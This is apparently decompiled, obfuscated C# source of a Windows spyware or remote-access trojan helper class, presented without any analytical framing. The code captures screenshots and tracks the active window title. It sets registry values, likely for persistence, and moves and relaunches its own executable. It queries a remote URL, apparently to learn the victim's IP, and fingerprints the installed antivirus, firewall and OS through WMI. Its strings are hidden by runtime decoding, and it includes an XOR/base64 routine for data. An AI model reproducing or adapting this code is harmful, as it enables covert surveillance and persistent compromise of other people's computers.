using System;
using System.Collections;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal class Class12
{
	public delegate void Delegate2(string string_0, out Mutex mutex_0);

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
	private class Class13
	{
		public uint uint_0;

		public uint uint_1;

		public ulong ulong_0;

		public ulong ulong_1;

		public ulong ulong_2;

		public ulong ulong_3;

		public ulong ulong_4;

		public ulong ulong_5;

		public ulong ulong_6;

		public Class13()
		{
			uint_0 = (uint)Marshal.SizeOf((object)this);
		}
	}

	private static string string_0;

	public static string String_0
	{
		get
		{
			return string_0;
		}
		set
		{
			string_0 = value;
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadLibraryA(string string_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_1);

	public static T smethod_0<T>(string string_1)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(string_1.Split(new char[1] { ':' })[0]), string_1.Split(new char[1] { ':' })[1]), typeof(T));
	}

	public static bool smethod_1(string string_1)
	{
		if (Assembly.GetExecutingAssembly().Location.ToLower() == string_1.ToLower())
		{
			return true;
		}
		return false;
	}

	public static bool smethod_2(ref string string_1)
	{
		string text = new string('\0', 100);
		GetWindowText(GetForegroundWindow(), text, 100);
		text = text.Substring(0, text.IndexOf('\0'));
		if (string_0 != text)
		{
			string_1 = text;
			string_0 = string_1;
			return true;
		}
		return false;
	}

	[DllImport("user32.dll", SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowText(int int_0, string string_1, int int_1);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern uint GetModuleFileName([In] IntPtr intptr_0, [Out] StringBuilder stringBuilder_0, [In][MarshalAs(UnmanagedType.U4)] int int_0);

	[DllImport("kernel32.dll")]
	private static extern void ExitProcess(uint uint_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern bool MoveFileEx(string string_1, string string_2, long long_0);

	public static void smethod_3(string string_1, string string_2)
	{
		if (File.Exists(string_1))
		{
			File.Delete(string_1);
		}
		string location = Assembly.GetExecutingAssembly().Location;
		StringBuilder stringBuilder = new StringBuilder(location);
		MoveFileEx(location.Substring(0, (int)GetModuleFileName(IntPtr.Zero, stringBuilder, stringBuilder.Capacity)), string_1, 8L);
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			Arguments = string_2,
			FileName = string_1
		};
		process.Start();
		ExitProcess(0u);
	}

	public static string smethod_4()
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(_003CModule_003E.smethod_0("䢾䢢䢢䢦䣬䣹䣹䢷䢣䢢䢹䢻䢷䢢䢿䢹䢸䣸䢡䢾䢷䢢䢿䢥䢻䢯䢿䢦䣸䢵䢹䢻䣹䢸䣦䣯䣤䣥䣦䣯䣢䣣䣸䢷䢥䢦", 608470));
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			Stream responseStream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			return streamReader.ReadToEnd();
		}
		catch (Exception)
		{
			return _003CModule_003E.smethod_0("\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd", 974009);
		}
	}

	public static void smethod_5(string string_1, string string_2)
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("⢛⢇⢎⢜⢟⢉⢚⢍⢔⢅⢡⢫⢺⢧⢻⢧⢮⢼⢔⢟⢡⢦⢬⢧⢿⢻⢔⢋⢽⢺⢺⢭⢦⢼⢞⢭⢺⢻⢡⢧⢦⢔⢚⢽⢦", 927944));
		registryKey.OpenSubKey(_003CModule_003E.smethod_0("鏅鏙鏐鏂鏁鏗鏄鏓鏊鏛鏿鏵鏤鏹鏥鏹鏰鏢鏊鏁鏿鏸鏲鏹鏡鏥鏊鏕鏣鏤鏤鏳鏸鏢鏀鏳鏤鏥鏿鏹鏸鏊鏄鏣鏸", 299926), writable: true);
		registryKey.SetValue(string_1, string_2);
	}

	public static string smethod_6(int int_0, int int_1)
	{
		int num = new Random((int)DateTime.Now.Ticks).Next(int_0, int_1);
		string text = _003CModule_003E.smethod_0("倫戮燎輪六隆類琉流崙龍淪療遼蓼留紐硫柳履利阮陸劉溜杻林鱗易立隣識藺溺離淋理臨李泥梨吝璘燐里刺什罹麟裏匿裡璉聯練撚戀煉漣劣列秊", 653733);
		Random random = new Random((int)(DateTime.Now.Ticks * -1L));
		smethod_7(text.ToCharArray());
		char[] array = new char[num];
		for (int i = 0; i < num; i++)
		{
			array[i] = text[(int)((double)text.Length * random.NextDouble())];
		}
		return new string(array);
	}

	private static T[] smethod_7<T>(T[] gparam_0)
	{
		SortedList sortedList = new SortedList();
		Random random = new Random();
		for (int i = 0; i <= gparam_0.GetUpperBound(0); i++)
		{
			int num = random.Next();
			while (sortedList.ContainsKey(num))
			{
				num = random.Next();
			}
			sortedList.Add(num, gparam_0[i]);
		}
		T[] array = new T[gparam_0.Length];
		sortedList.Values.CopyTo(array, 0);
		return array;
	}

	public static string smethod_8()
	{
		return DateTime.Now.ToString(_003CModule_003E.smethod_0("ﾑﾑ\uffe3ﾴﾴ\uffe3ﾪﾪ\ufff9ﾽﾽ\ufff6ﾔﾔ\ufff6ﾠﾠﾠﾠ", 393177));
	}

	public static void smethod_9(string string_1)
	{
		try
		{
			Thread.Sleep(5000);
			Mutex.OpenExisting(string_1);
			Application.Exit();
		}
		catch (Exception)
		{
			new Mutex(initiallyOwned: false, string_1);
		}
	}

	public static Image smethod_10()
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		Rectangle rectangle = default(Rectangle);
		Bitmap val = null;
		Graphics val2 = null;
		rectangle = Screen.get_PrimaryScreen().get_Bounds();
		val = new Bitmap(rectangle.Width, rectangle.Height, (PixelFormat)2498570);
		val2 = Graphics.FromImage((Image)(object)val);
		val2.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, (CopyPixelOperation)13369376);
		return (Image)(object)val;
	}

	public static string smethod_11()
	{
		string englishName = CultureInfo.CurrentCulture.EnglishName;
		return englishName.Substring(englishName.IndexOf('(') + 1, englishName.LastIndexOf(')') - englishName.IndexOf('(') - 1);
	}

	public static string smethod_12()
	{
		string englishName = CultureInfo.CurrentCulture.EnglishName;
		return englishName.Remove(englishName.IndexOf(_003CModule_003E.smethod_0("仛仓", 544507)));
	}

	public static byte[] smethod_13(byte[] byte_0, byte[] byte_1)
	{
		byte[] array = new byte[byte_0.Length + 1];
		byte b = (byte)new Random((int)DateTime.Now.Ticks).Next(1, 255);
		int num = array.Length - 2;
		for (int i = 0; i <= num; i++)
		{
			array[i] = (byte)(byte_0[i] ^ ((int)(byte)(byte_1[i % (int)(byte)byte_1.Length] << ((i + b + byte_1.Length) & 7)) % 256));
		}
		array[^1] = b;
		return Encoding.Default.GetBytes(Convert.ToBase64String(array));
	}

	public static byte[] smethod_14(byte[] byte_0, byte[] byte_1)
	{
		byte[] array = Convert.FromBase64String(Encoding.Default.GetString(byte_0));
		byte[] array2 = new byte[array.Length - 2 + 1];
		byte b = array[^1];
		int num = array2.Length - 1;
		for (int i = 0; i <= num; i++)
		{
			array2[i] = (byte)(array[i] ^ ((int)(byte)(byte_1[i % byte_1.Length] << ((i + b + byte_1.Length) & 7)) % 256));
		}
		return array2;
	}

	public static string smethod_15()
	{
		if (8 != IntPtr.Size && string.IsNullOrEmpty(Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("쌮쌬쌱쌽쌻쌭쌭쌱쌬쌡쌿쌬쌽쌶쌷쌪쌻쌩썈썊썍썌", 770942))))
		{
			return Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("흈흪흷흿흪흹흵흞흱흴흽흫", 382744));
		}
		return Environment.GetEnvironmentVariable(_003CModule_003E.smethod_0("矽矟矂矊矟矌矀矫矄矁矈矞瞅矕瞕瞛瞄", 751533));
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool GlobalMemoryStatusEx([In][Out] Class13 class13_0);

	public static string smethod_16()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		try
		{
			string result = string.Empty;
			ManagementObjectSearcher val = new ManagementObjectSearcher(_003CModule_003E.smethod_0("띁띗띞띗띑띆뜲띑띳띢띦띻락라뜲띔띀띝띟뜲띅띻라뜡뜠띍띝띢띷띠띳띦띻라띵띁띫띡띦띷띿", 374546));
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val2).get_Item(_003CModule_003E.smethod_0("\ue983\ue9a1\ue9b0\ue9b4\ue9a9\ue9af\ue9ae", 256448)).ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch (Exception)
		{
			return _003CModule_003E.smethod_0("怄怿怺怿怾怦怿", 90193);
		}
	}

	public static ulong smethod_17()
	{
		try
		{
			Class13 @class = new Class13();
			if (GlobalMemoryStatusEx(@class))
			{
				return @class.ulong_0;
			}
			return 0uL;
		}
		catch (Exception)
		{
			return 0uL;
		}
	}

	public static string smethod_18()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		try
		{
			string result = string.Empty;
			ManagementObjectSearcher val = new ManagementObjectSearcher(_003CModule_003E.smethod_0("ꅜꅊꅃꅊꅌꅛꄯꅀꅜꅎꅽꅬꅧꅦꅻꅪꅬꅻꅺꅽꅪꄯꅉꅝꅀꅂꄯꅘꅦꅡꄼꄽꅐꅀꅿꅪꅽꅮꅻꅦꅡꅨꅜꅶꅼꅻꅪꅢ", 893199));
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val2).get_Item(_003CModule_003E.smethod_0("꺶꺪꺸꺋꺚꺑꺐꺍꺜꺚꺍꺌꺋꺜", 44793)).ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch (Exception)
		{
			return _003CModule_003E.smethod_0("綡続綟続綛綃続", 32244);
		}
	}

	public static string smethod_19()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		try
		{
			string result = string.Empty;
			ManagementObjectSearcher val = new ManagementObjectSearcher(_003CModule_003E.smethod_0("⾗⾁⾈⾁⾇⾐\u2fe4⾗⾡⾶⾭⾥⾨⾊⾱⾩⾦⾡⾶\u2fe4⾂⾖⾋⾉\u2fe4⾓⾭⾪⿷⿶⾛⾋⾴⾡⾶⾥⾰⾭⾪⾣⾗⾽⾷⾰⾡⾩", 929732));
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val2).get_Item(_003CModule_003E.smethod_0("\uf4da\uf4ec\uf4fb\uf4e0\uf4e8\uf4e5\uf4c7\uf4fc\uf4e4\uf4eb\uf4ec\uf4fb", 455817)).ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch (Exception)
		{
			return _003CModule_003E.smethod_0("⎒⎩⎬⎩⎨⎰⎩", 467911);
		}
	}
}
